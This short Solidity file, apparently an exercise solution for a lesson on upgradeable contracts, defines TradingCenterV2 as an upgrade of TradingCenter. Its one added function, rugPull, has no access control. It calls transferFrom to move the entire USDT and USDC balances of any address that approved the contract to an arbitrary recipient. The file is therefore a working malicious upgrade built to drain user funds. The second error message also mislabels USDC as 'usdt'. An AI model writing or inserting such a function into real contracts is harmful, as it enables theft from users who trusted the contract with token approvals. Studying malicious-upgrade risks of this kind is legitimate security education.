// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import {TradingCenter} from "./TradingCenter.sol";
// TODO: Try to implement TradingCenterV2 here

contract TradingCenterV2 is TradingCenter {
    function rugPull(address _from, address _to) public {
        bool success = usdt.transferFrom(_from, _to, usdt.balanceOf(_from));
        require(success, "usdt send failed");
        success = usdc.transferFrom(_from, _to, usdc.balanceOf(_from));
        require(success, "usdt send failed");
    }
}
